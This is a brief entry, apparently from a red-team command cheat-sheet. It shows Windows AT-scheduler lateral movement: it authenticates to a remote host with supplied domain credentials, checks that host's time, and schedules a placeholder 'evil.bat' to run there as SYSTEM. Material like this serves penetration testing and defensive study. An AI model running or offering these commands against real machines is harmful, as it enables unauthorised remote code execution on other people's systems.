---
id: b3bccd06-63fa-492c-8bd6-e060b096589b
name: AT Executes as system and must be an Admin to run it. Check groups with whoami
  /groups
type: command
executor: bash
data: 'at 13:20 /interactive cmd net user \\target /user:Domain\user pass

  net time \\target

  at \\target 13:20 c:\temp\evil.bat

  '
output: null
created_at: '2020-07-14T18:21:10.244874+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# AT Executes as system and must be an Admin to run it. Check groups with whoami /groups

```bash
at 13:20 /interactive cmd net user \\target /user:Domain\user pass
net time \\target
at \\target 13:20 c:\temp\evil.bat

```


